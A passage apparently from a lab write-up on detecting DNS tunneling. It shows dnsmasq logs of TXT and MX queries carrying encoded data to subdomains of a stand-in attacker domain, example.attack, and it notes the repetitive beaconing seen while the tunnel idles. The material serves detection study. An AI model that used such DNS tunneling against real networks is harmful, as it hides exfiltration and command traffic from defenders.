Aug 23 06:03:59 dnsmasq[1]: reply pabqgcra.example.attack is zzPxaIyD-vgzKimvcquleBWnmkcmd-sZeesrcaLynmZHPsL3cJ1ghL8XZKBzicIoeG42S62Wi0KiHb0MQZqi53bqYyk1I5FQRDY9B2V0y-zrDUwilUQFAz7d2uDpJqEDSS7z+XWd9HU7C1IPHlkqnYrjBX5bPEy5hnYwboIx+UT4tTqb9p3EoopMRwE1rTSSTiPqHyuyer+TAPznlh6AHtneMvTIbEzHkGdtcppWoS+O+hUPboVKyL4wwipW
Aug 23 06:03:59 dnsmasq[1]: reply pabqgcra.example.attack is HDznYAy+pR9IfPaBHKrmzefvtXKyjCWSQ5sda4-0dLQFPRp+dzapscVJ0G8tvCCDa8wbRnKHCA5kfpCelSB5hmiKu3YG-CUHFmUuOYKfcLSy5hmDBnX6IM-kCh22sCyUTpjx1aoJp9HhUati5fZ33sPgx9PEqYSan
Aug 23 06:03:59 dnsmasq[1]: query[TXT] pabygcrq.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded pabygcrq.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply pabqwcri.example.attack is sGopshDyJaqmjMndGLuoZs-CjiJEzZoMaPeSRg8Oj-EtvHSUHklotIXS7ZRPvJqzIxz0HSBdyARAp+fn+CjtXEae5J81VbAgFGY-R1ErnqfatF4ifvLepLFiv+sRSrljX-tW4uDDyhMEV7KfZHtHRllsz2f6RUYSvmKAbzvBtAmhRim1OR+qm-mAXlLbJ0j3JJcINH-JSatWP8BV3zcfrBkqEZjlD4S5EWYjkuAUj6MLUAhoGs1XScrDnXNm
Aug 23 06:03:59 dnsmasq[1]: reply pabqwcri.example.attack is HyI0xFZdmt3-Gd-Cgv0NM1X8Xq0LC0xwJgXQTus7QkgO1nqPP18PR886+5WU1hWa69GJFkod5uUoX6bYqr4HZWhqtIulevMczlFmorqfi1u8hHHQt
Aug 23 06:03:59 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply pabygcrq.example.attack is sKab31GfUbjh6aaaiaeuibgPf7uaaqaBCKGOaaaekaaacabAC2g7FpXTZ7KoKGbaaY2mWaaabaqGk+LOwd5D9O2qzDPedsEzL0xsIqg-04hZ8x4zl0kCCIhNTP2R4daaxVOpsDFn--D9Qo9Yi1ZjyhXXqU2-9QrN24zdllltSoxXTMtFrGYQL6PgCunq7rDlF06+-OOYp2DKkOU2uQ+5dO13TRSkedtZnubWWBWT00DvI+7xcQ0AJPDiRDXp
Aug 23 06:03:59 dnsmasq[1]: reply pabygcrq.example.attack is YzbHDMHOkHogMzZSN0LLCEww1QIYFf6EsNk4vMesx4ojeVJQZLXfbYAMOaVW2CLHRLOAon-QnwYCZWn2Z4DkcadJur21PWT-sHNrkKTbJY3PLOP6FNyOkMi32ROcH9pK46J2TiCV6++q8gczVoBG7UZk74ya1oVve1InbqO1pIF8qUCxfOhZ8-iIz0hjkLLf8jin9OSrTpSDfNjW9aA9wL083qXFXXEwuxgpK3I3H53QsCSGluxG7AsWrCnY
Aug 23 06:03:59 dnsmasq[1]: reply pabygcrq.example.attack is Z4escuKbkmouEzEyy3dUPA4LT8d8SwQC59Ns-49AXcdXzrej97zlgiKtdl-4YnEvQE7yioOaHoow0gZJsDWe0eh9SPhnBxKZS-+tu5yMsbVj4VC4HPUSCybeCi8ayzu8Pkv-iG9ubgUManAqCY+hk1IOdDkAzfk2d9qLC2VQJL8Vm0nbLO5N0TMUP5MLtIcMesPNpvjGywJb1kqUyegaMv6MhBInu63zNfoxcTY+YY2eZUvzsQT0FURQ8VDl
Aug 23 06:03:59 dnsmasq[1]: reply pabygcrq.example.attack is f5m-6C7cacMEDkR1ld7twpHFW9lV12EEUazfuvSCyXlHRtgBwNxUwn8m3YsXz7N7CMaQhxEz8nM7k7yuWKbFwkhynjQaT8mTBYu-uIaqRhmlPMLOSGEXqzaliTk+W2yiZI9C2GRfNKmw+GaI-xfYGqDod6gdFkTSHiJYq9VVcWDZZ6Aw1z4WnEQhtGEUNvwtMZCkxB2peaue2Hobx7QU74B-8clN3XZm4sUgHdH2PRjI2ponxfdr5iaZQQZH
Aug 23 06:03:59 dnsmasq[1]: reply pabygcrq.example.attack is SlJ1kKZcdG6ImUqqBxgqob2I+cJwKXPKz-PJeZX1lbEKuov9Jta98uYpHhsaYJToCnwg-KoN2KyVQA393cHaDpeaqoF8GP0gCtIsr6MKshu72P+k4ysc4gSlJounK6iuLSV-6juUyxndckjoRQuBwXvddWbTSvPGw
Aug 23 06:03:59 dnsmasq[1]: query[TXT] paaagcry.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded paaagcry.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply 0ehdz82�2hb����gc��۾�Ww�O�Udb��dE6��qv����t��VU�yc�ѽ��cbmp��.U��F�lj���g�iD9.example.attack is sKapS1-V557C1L3zI6XGHUYMASiqZ4t3tvpa-aVq5VAeKdxn3Syz7YWrTGDVYD0M1YS6YOUlVMyrl3gb6jl1F9TvTjYBGjUMrS+SPDcs2No6R6LcMSRV2opsHDKa3UolgdTKg4uu4tTRxbV0qVjjQqlmLpASRDk2dzV9y2tPEXpJgDRA5qO21FEwBI3Z+iBW2dLO+ASaU3R0jo-dptm-BJpbtqbilurQXgInYnvHOLfgLkM4NABiE5XImirD
Aug 23 06:03:59 dnsmasq[1]: reply 0ehdz82�2hb����gc��۾�Ww�O�Udb��dE6��qv����t��VU�yc�ѽ��cbmp��.U��F�lj���g�iD9.example.attack is djFSbvvYialhu9au2D40B5bhy9Qwrxwcti+VQPW51nvKC5NdRjDVcYETbMCyr47ZUEMJNKRnwagmrBQEvrj8mCnI74PYF8f8qDvifOxv8SsEqetn5
Aug 23 06:03:59 dnsmasq[1]: query[TXT] paaawcsa.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded paaawcsa.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply paaagcry.example.attack is sKcb31GfUbjh6aaaiaeuibgPf7KaaqaBCKqOaaaekaaacabAC2g7Fq0fZ7KoKGbaaY6NzaaabaqGk+LOwd5D9O2qh3g6mTdR1E+NCHzFTWcWpcyOdi9NZ0inJRhJ9Wa3SdaG+t9AhWdwNru+60GHj5VAwR-kOh-LXDqcO3R5TOLIuYlpHseZD6p8+atvj-eMrbhlV-z9iSO+G7C0CrIf9kqGm-6gqIjcYEE3P-2f8RbP4o7NFILqxDAnYMP5
Aug 23 06:03:59 dnsmasq[1]: reply paaagcry.example.attack is URu4EI46+vM37isDdTNbHPiUwyBIttR8uBJgR4TjMIpKIb4NHBR8lgbFgDVGwDHWogZN6KCk-cif6TVhO8c3PoL5VnJu7fCA6-KWk9RF2VKTR7z0OGHULqSMb6gBgz+ld1ZbKcWLF9qqVjK6JkGtWCBEyWy6tkYgQ2PnFXEuo87IAT2YTIxkXjBIijdSndCz2H7mDytjdfEneDcWOStXK5d-1ZAd-KC0KYbhBMi75QVNXK8uebjnTPusgrlz
Aug 23 06:03:59 dnsmasq[1]: reply paaagcry.example.attack is oPAR97pXAYtY-h4Gs4+Le+x0OIB4Ye1C7Dm5b6tSsJvVp6ZtHfMdEBu7KmpfeEG59Oflc-8U+aeQFlJgAUsBrYu5EjKXt3CHJavfeCd2misvE+r80BaW4bTwh98uvIdI2zb9PLocpTH1BqzVnYvhNBLh6ntOf6p01gS6CpBO2rQc1cYFP3uiq3Hd0pk9YFu7Nm7QuOR8DpIDEUtPoeeXqCavUC+aeVkqC0FBD4MQqIKLkEZyGZ+1hgeZe53J
Aug 23 06:03:59 dnsmasq[1]: reply paaagcry.example.attack is PjQENA17Qv+aCkVepR92wz5XGTt4BVCBPoHwUBi+lKlZ2INe7CcAie6AVBUOo75xNhydGXMS3ka6xvPJRMu6KOoufcovfPNdCZ5QclJwmnF6EVURhPFjfcJcKvEiF+SoEJhTZe9bXU1g3mgkn4aM7wfLJGIwSAWLkKdFdVx7KcXD3rA8wByJh-KySakKkMbWJ8jKFLTQkb80qY7m5mAMACpDmP1RbQX5Qu85mGz5muQSwHYRgU7aqtSzKv6Y
Aug 23 06:03:59 dnsmasq[1]: reply paaagcry.example.attack is 3cZQBy7P7io-n6h2ydwoILrsP93OTIc29MpP0lC2nvtWK-yQUtut4BGH+3TOKUH2sQ5Wni1DFSZzD0M-bOP0UqgULsKhKI2k9N97dihSxnoFfeEU8fBnBSzxjCWe-vRDr4uB5D2HX1cNTUZA7VEAuwFIR5ta8aAD5
Aug 23 06:03:59 dnsmasq[1]: query[TXT] paaigcsi.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded paaigcsi.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply paaawcsa.example.attack is sKcogbHnJo420lldFrs00IAbUaI1rrMZC3cU14Dlxs0XwjczzI-OKTIynPGnZCfr+9uxwoq0t+w-v3ZDlvVK3Xx-NMxVZtpfX94q6EAb8YuYBVk6HzhJ-WfZ7TJGrBv4-Kb-bkoYLQ67VO2Mx3cIx0m2O-XKjMDCS5H9h8Q3gm2K4KkzJTtjq-qFsxPcAZO2OBhb7gCNHOeNOlm6YzANUQ6lsUqEI1rTiYIrN2W+sqYecwb8WUR4kxapbW8n
Aug 23 06:03:59 dnsmasq[1]: reply paaawcsa.example.attack is yQ5nsepvgdNLuWC5EgorwZ6RqO-DZXae64Gb5mJN3tQZQG00xDj4j5OoozsM0+HApaTW2RciACLxj1veNi-zgUryl1ny9atdBbaVPSYzMCafd+cEg
Aug 23 06:03:59 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply paaigcsi.example.attack is sOeb31GfUbjh6aaaiaeuibgPf7-aaqaBCKaOaaaekaaacabAC2g7Fr3DZ7KoKGbaaY2+PaaabaqGk+LOwd5D9O2sRiEz9eWxNQo+6m2cb2B6MSymsRGnpcGmgQVdRQ94QDYo4FEABE2n-bdaSJCVyHqgGPeehxiPPzGy66I2I8I3k53wk0k3t9c46WTW8b5c-AzJmt4UxyUhF-K8EAOkp-IDYdYt6QjBLGIHzqWwbwzOVmK5w-UdNLTPm28a
Aug 23 06:03:59 dnsmasq[1]: reply paaigcsi.example.attack is rfyipvPN7uI1e-puCuqx2tQdOHCvrr8kAjZaM+KIu2No6rcjKIWHs6yyHwOggfl5a-mHU-6j-goMOlqYzuAvvExReg5sD57IL3EFku5IqYujkh7RCLpiRzlwKzG7xvjUmDkr2rl7kpT1za1lyH2u1zSZm4RffYQG0U4vQlWwWEYt-EY3pVyUVEALyTeJEFx6TvjQjqmEMGXeRV7dk9tELLtLPTUgebDcGWv3+KIEoxOdOOtzqGfiJMAEnQ1t
Aug 23 06:03:59 dnsmasq[1]: reply paaigcsi.example.attack is sOPjgn0UC55fKzSbjkkgd9G3Q3MR2rIe5BhHG8VSRDEU07AlEM5HXCL+5rXDtzxTKz1e1t3KoeHU-4gVrMTpK7Q2pgtCSIschRmsRbD+sNDbNJZ8JqIoRQ+pjeBAKze2Be4MiZHH4tdj+tylauIlCE9-johrw2+eUhucuAaxxfO3rVAdA-o44XSQMOdUbrKfL06s5pbkssjCyQMqjsHlqcHzjmqj6zXcFGu3sdusITWfDW-g+liR8Fy0M8-r
Aug 23 06:03:59 dnsmasq[1]: reply paaigcsi.example.attack is rytu4oFVVtbivcNpSlKjNvlPTUq7EU4X-ztPaLmvjAia-oNJMPdDkFr1pyq0-X1Y7sEt-ZgvgVc0oDQzZt9Mt1hD874HttYkcrNC1xrLrQdBoSQYZykkfif2EUucb+r6ZfrwO-3787wN-sxI+Fk5v5W+W46VjNogEpr+lxoAiH0xE4UWLJpuTQREjIHU7k7N3nXQFM37UJ5GdvDutg04fg2I102KtpcBf-I0+GBLfX1+FMg-hlvTBfTirYKd
Aug 23 06:03:59 dnsmasq[1]: reply paaigcsi.example.attack is wdvLDMaYV4RzBeq3bmYEUND2EGX40etXMfgLrYgpinYuGKELfrPwSFdmaNfolFdqb+LYj4Qt0XDRjdihoOcg4yP4MrO1RXwG0pV1A73FBeXDhjJn8C+qdGj3Wcjt5FxTiSx5kNMjOgM0yenQLFZA1jcOHJSVDTuNV
Aug 23 06:03:59 dnsmasq[1]: query[TXT] paaqgcsq.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded paaqgcsq.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply 0ibd082�2hb����gc�����Ww�PmUdb��dE6��qv����t��E�4yb����OekyDU�.�X5��ws��icyF8.example.attack is sOemVnDN0fnJWFHZNCdR90TD0Qt2Ab+0o0C8ETjarhQ7Mb9vPl8boHLruZWu-ic6iDpp4zv-jqdrQxInGslRT++Qwl1Ygi856m6l-kIfk39hZYvrXbK2DzgE8ZxBCnZ3pJ+j4ct8n53Zl9WO7itN5wkEG-13vNPgFxQ0LqBfCzBLFKOhZVrE7MqkP+MmXirlTu0DlS2SXgx7yqG9Sl1QK4jppcSGk-UBHun+IoYClL38-YLwDXgqIRsDJdO8
Aug 23 06:03:59 dnsmasq[1]: reply 0ibd082�2hb����gc�����Ww�PmUdb��dE6��qv����t��E�4yb����OekyDU�.�X5��ws��icyF8.example.attack is YZ+UlhPaleJnJl-aX1PiU55uAGCMY+Q62QcwLjfWYXHqeh5RjIdq7bgRgGCSZHrRFZpW1PNbMaScSLhoynq6ayE00H6I7UIJLV1VOc+KQJRLWtH1q
Aug 23 06:03:59 dnsmasq[1]: query[TXT] paaqwcsy.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded paaqwcsy.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply paaqgcsq.example.attack is sOgb31GfUbjh6aaaiaeuibgPf8eaaqaBCJWOaaaekaaacabAC2g7Fs60Z7KoKGbaaY0YnaaabaqGk+LOwd5D9O2rtEFRsJGeJzcOOhEd0Lqu2qTiExX3rkTIU5tqrItMjFMJsKwfSvCVthlV1fpPxWdjAt3DUqWDszfteNJAgUMKwelolGm08bYyvWHK6Irnfo0Pez-QsI49bTpYjXmc20LlpEZs-IJy2RHJLGwFlmMz95dZ-dcEfGNlL4TT
Aug 23 06:03:59 dnsmasq[1]: reply paaqgcsq.example.attack is oTZln3K9qqnibh2zijjWysTdmf2EguBmLdSfLr+R1UYzLvVBUTw0xYK04RQ18UbtgrtQchyDAdWw8jZizFeZabiSjrKQHfnzZ-fZu4riBaoffjUMOj+GtGxQ6jMTo69FE8kRiTcNibA4drfJqS5doEOP8pnB4hX2ATiQeO01UI897a7+NWax40bpF3+GHTnumHFkVOcwgIXY+t4hpJ9QEVt+wnN9KzBTw0pQJ5VEOG1tCbmAd2+lKxujGtaX
Aug 23 06:03:59 dnsmasq[1]: reply paaqgcsq.example.attack is hD2i+FmaeQbkpOEDVYU19dEqqpsWJ3XsDECI0kvreOrh0Daa1u61rjn83nCIFu+tbNy7vmdr-Ft-o00oYnoSkir9pgDuBtp98jVggWxQx4hlfavU9OSqs2BekzfS9MRHpiPSQR81oPDno+5GpnctaRFgNJoehSvN--jIv6W8TLPBz43I9dkZSyajg6QGvwgqfmGHBab8Ruoc19l4hqaHghhQqcHIgtNJsHiZVurxhWIiJ19WXpebXzFGcIfz
Aug 23 06:03:59 dnsmasq[1]: reply paaqgcsq.example.attack is d-zhN7121M-phQW0wRtnV1jlleoN0O6L-W0fQ4CnQUWoD+kOta-PGuwbqJDvlzuhodMalAVFV00-EWSSgbrDycQOSdYv5uAw1Oo66HwIfYwlO+L23RnUfujLkJFSlVuEW+lYeAgTGEXLUMncuy38mfiijP0m3ztVKn5a-AAIVYxAk+XsFjfnOzu7AG0et33m0hBHmFJ6-IBNaUDMnoDqeTU2SVSiGvIaAC-6oq6I0pWgBh0xqywlNkvCowTT
Aug 23 06:03:59 dnsmasq[1]: reply paaqgcsq.example.attack is je0Cl1mp5liwj9Y+XH8Q58PPZqxidgoVA5vUnxNCmiRXeukJrgYnwcyfBjtw9fyOSyDQoNf71TNyCRtC0oEJZu2DRebjaTeHTSuUwQFHylslUq9FazBKtBQ165KqLf7SDW9ujJv76oiIJqIqX8XmnR78YndJ9Q2Pv
Aug 23 06:03:59 dnsmasq[1]: query[TXT] paaygcta.example.attack from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded paaygcta.example.attack to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply paaqwcsy.example.attack is sOgnBAPn0iAT3p4V8QMe8o02WdiV2InVrVdA2w5VqavOnxmnLGAKz6PiB1rQup7vCrlVkYCUWJ7rN0dj3aeWHX73PKCNtuRyzFl5w-4NgdK0xby-WOwV5UhJvyudL1jMPvrA00dJrPVzBt9zO3LNdZNKLQvWtAaOV7cuUN9-EP2INbFpTeG4+OGyl0anw8nrkc29VEqgEzxgtthpcjXz8wzopf1i-Y02sGqy079MsmDAQ0q3S76eOjVUJwfx
Aug 23 06:03:59 dnsmasq[1]: reply paaqwcsy.example.attack is hjzZ8Gj1QwtSyUAp1m-xIHNjp5ItIPSBgWYfPcwivFttVuRVumFuW+uOHokcUZomGuSEJuOWuYaO+08ZZLq75ECSu1FCXcod6pZVTt1IbBxZzPb1q
Aug 23 06:03:59 dnsmasq[1]: query[TXT] <name unprintable> from 172.18.0.3
Aug 23 06:03:59 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:03:59 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:03:59 dnsmasq[1]: reply paaygcta.example.attack is 
```


</p>
</details>


<details>
<summary>When the tunnel gets established and when transferring data we can see a lot of fancy traffic. However when the tunnel is merely kept alive we can see a very repetative beaconing pattern.</summary>
</p>

```console
Aug 23 06:06:30 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:30 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:30 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:30 dnsmasq[1]: query[MX] paaqg30a.example.attack from 172.18.0.3
Aug 23 06:06:30 dnsmasq[1]: forwarded paaqg30a.example.attack to 172.18.0.2
Aug 23 06:06:30 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:30 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:30 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:30 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:30 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:30 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:30 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:30 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:30 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:30 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:30 dnsmasq[1]: query[MX] pabqg30i.example.attack from 172.18.0.3
Aug 23 06:06:30 dnsmasq[1]: forwarded pabqg30i.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paaqg30q.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paaqg30q.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paaqw30y.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paaqw30y.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paayg31a.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paayg31a.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] pabag31i.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded pabag31i.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] pabaw31q.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded pabaw31q.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] pabig31y.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded pabig31y.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] pabqg32a.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded pabqg32a.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] pabqw32i.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded pabqw32i.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] pabyg32q.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded pabyg32q.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paaag32y.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paaag32y.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paaaw33a.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paaaw33a.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paaig33i.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paaig33i.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paaqg33q.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paaqg33q.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paaqw33y.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paaqw33y.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] paayg34a.example.attack from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded paayg34a.example.attack to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
Aug 23 06:06:31 dnsmasq[1]: query[MX] <name unprintable> from 172.18.0.3
Aug 23 06:06:31 dnsmasq[1]: forwarded <name unprintable> to 172.18.0.2
Aug 23 06:06:31 dnsmasq[1]: nameserver 172.18.0.2 refused to do a recursive query
```

</p>
</details>


